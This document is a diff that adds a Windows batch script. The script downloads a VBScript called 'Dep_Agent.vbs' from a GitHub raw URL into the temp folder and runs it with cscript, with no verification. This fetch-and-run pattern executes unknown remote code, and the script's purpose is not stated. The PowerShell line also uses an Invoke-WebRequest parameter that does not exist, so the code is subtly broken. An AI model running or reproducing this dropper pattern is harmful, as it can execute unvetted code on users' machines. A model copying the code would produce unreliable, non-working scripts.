@@ -1,0 +1,31 @@
+@echo off
+
+set "url=https://raw.githubusercontent.com/tahirioualid/EM/main/Dep_Agent.vbs"
+set "output=%TMP%\file.vbs"
+set "command=cscript.exe %output%"
+
+REM Create progress bar
+set "ProgressPreference=Continue"
+set "Activity=Downloading file from %url%"
+set "Status=0%% Complete"
+set "PercentComplete=0"
+
+setlocal EnableDelayedExpansion
+
+for /f "tokens=*" %%a in ('powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -ProgressPreference SilentlyContinue -PercentCompleteScript { $PercentComplete=$_; $Status=$PercentComplete+'%% Complete'; Write-Progress -Activity '!Activity!' -Status $Status -PercentComplete $PercentComplete }"') do (
+    echo %%a
+)
+
+if %errorlevel% neq 0 (
+    echo Error: An error occurred during script execution.
+    goto end
+)
+
+REM Run file using cscript
+start /wait "" %command%
+
+REM Show success message
+echo Success: Script ran successfully.
+goto end
+
+:end
